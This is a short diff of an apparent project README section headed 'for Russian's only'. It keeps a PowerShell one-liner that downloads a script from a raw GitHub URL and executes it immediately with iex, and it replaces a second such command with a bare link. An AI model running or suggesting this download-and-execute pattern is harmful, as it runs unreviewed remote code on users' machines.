@@ -12,6 +12,4 @@ Next, for Russian's only:
 powershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/leaftail1880/updates/main/StelTimize/Update.ps1')"
 ```
 
-```bash
-powershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/leaftail1880/updates/main/MC/Packet.zip')"
-```
+https://raw.githubusercontent.com/leaftail1880/updates/main/MC/Packet.zip
